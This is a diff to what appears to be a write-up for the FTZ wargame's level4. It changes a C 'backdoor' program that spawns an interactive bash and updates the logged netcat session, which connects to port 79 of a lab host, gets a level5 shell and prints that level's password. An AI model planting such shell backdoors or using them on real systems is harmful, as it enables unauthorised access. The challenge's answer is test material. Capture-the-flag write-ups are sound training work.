@@ -54,7 +54,7 @@ ls: /home/level4/tmp/backdoor: No such file or directory
 
 int main()
 {
-        system("/bin/bash");
+        system("/bin/bash -i");
         return 0;
 }
 [level4@ftz tmp]$ gcc -o backdoor backdoor.c
@@ -76,8 +76,11 @@ so you need to use nc(netcat) or telent command in remote
 ```
 ┌──(root💀kali)-[~]
 └─# nc 192.168.10.240 79
-id
+bash: no job control in this shell
+stty: standard input: Invalid argument
+[level5@ftz /]$ id
 uid=3005(level5) gid=3005(level5)
-my-pass
+[level5@ftz /]$ my-pass
+
 Level5 Password is "what is your name?".
 ```
